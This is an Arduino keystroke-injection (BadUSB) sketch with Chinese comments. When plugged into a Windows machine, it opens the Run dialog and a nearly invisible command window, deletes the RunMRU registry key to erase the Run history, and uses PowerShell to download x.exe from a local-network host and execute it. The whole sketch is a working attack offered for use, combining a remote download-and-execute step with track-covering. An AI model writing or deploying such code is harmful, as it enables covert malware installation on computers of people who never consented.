 void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500); 
  Keyboard.println("powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://192.168.1.102/x.exe';$file = ' C:\\x.exe ';$clnt.DownloadFile($url,$file);"); 
  delay(3000);
  Keyboard.println("c:\\x.exe&exit");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
